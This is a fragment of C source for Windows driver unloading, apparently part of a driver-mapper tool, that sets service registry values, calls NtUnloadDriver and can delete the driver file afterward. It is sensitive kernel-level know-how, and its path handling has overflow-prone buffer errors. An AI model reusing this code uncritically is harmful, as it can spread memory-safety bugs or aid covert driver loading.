	Win32Status = RegSetValueExW(KeyHandle, L"ErrorControl", 0, REG_DWORD, (const unsigned char*)&DwordValue, sizeof(DwordValue));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	DwordValue = 3;
	Win32Status = RegSetValueExW(KeyHandle, L"Start", 0, REG_DWORD, (const unsigned char*)&DwordValue, sizeof(DwordValue));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	PathBuffer = (wchar_t*)VirtualAlloc(0, MAX_PATH * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!PathBuffer)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	wcscpy(PathBuffer, L"\\??\\");
	if (!wcsstr(FilePath, L"\\"))
	{
		GetCurrentDirectoryW(MAX_PATH * sizeof(wchar_t), PathBuffer + wcslen(PathBuffer));
		wcscpy(PathBuffer + wcslen(PathBuffer), L"\\");
		wcscpy(PathBuffer + wcslen(PathBuffer), FilePath);
	}
	else
		wcscpy(PathBuffer + wcslen(PathBuffer), FilePath);

	Win32Status = RegSetValueExW(KeyHandle, L"ImagePath", 0, REG_SZ, (const unsigned char*)PathBuffer, (wcslen(PathBuffer) + 1) * sizeof(wchar_t));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(PathBuffer, 0, MEM_RELEASE);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	VirtualFree(PathBuffer, 0, MEM_RELEASE);
	RegCloseKey(KeyHandle);

	ServiceLoadPath = (wchar_t*)VirtualAlloc(0, MAX_PATH * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ServiceLoadPath)
	{
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	wcscpy(ServiceLoadPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
	wcscpy(ServiceLoadPath + ((sizeof(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") - sizeof(wchar_t)) / sizeof(wchar_t)), ServiceName);

	RtlInitUnicodeString(&ServiceLoadPathW, ServiceLoadPath);

	NTStatus = NtUnloadDriver(&ServiceLoadPathW);
	if (!NT_SUCCESS(NTStatus))
	{
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		VirtualFree(ServiceLoadPath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTStatus) | 1;
	}

	RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
	VirtualFree(ServicePath, 0, MEM_RELEASE);
	VirtualFree(ServiceLoadPath, 0, MEM_RELEASE);

	return STATUS_SUCCESS;
}

static GeneralErrorCast UnloadDriverA(const char* FilePath, const char* ServiceName)
{
	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	wchar_t WService[MAX_PATH];
	wchar_t WPath[MAX_PATH];

	mbstowcs(WService, ServiceName, strlen(ServiceName) + 1);
	mbstowcs(WPath, FilePath, strlen(FilePath) + 1);

	return UnloadDriverW(WPath, WService);
}

static GeneralErrorCast UnloadDriverExW(const wchar_t* FilePath, const wchar_t* ServiceName)
{
	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	GeneralError Error;

	Error.ErrorValue = UnloadDriverW(FilePath, ServiceName);
	if (!NT_SUCCESS(Error.NTStatus))
		return Error.ErrorValue;

	DeleteFileW(FilePath);
	return STATUS_SUCCESS;
}

static GeneralErrorCast UnloadDriverExA(const char* FilePath, const char* ServiceName)
{
	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	wchar_t WService[MAX_PATH];
	wchar_t WPath[MAX_PATH];

	mbstowcs(WService, ServiceName, strlen(ServiceName) + 1);
	mbstowcs(WPath, FilePath, strlen(FilePath) + 1);

	return UnloadDriverExW(WPath, WService);
}

#endif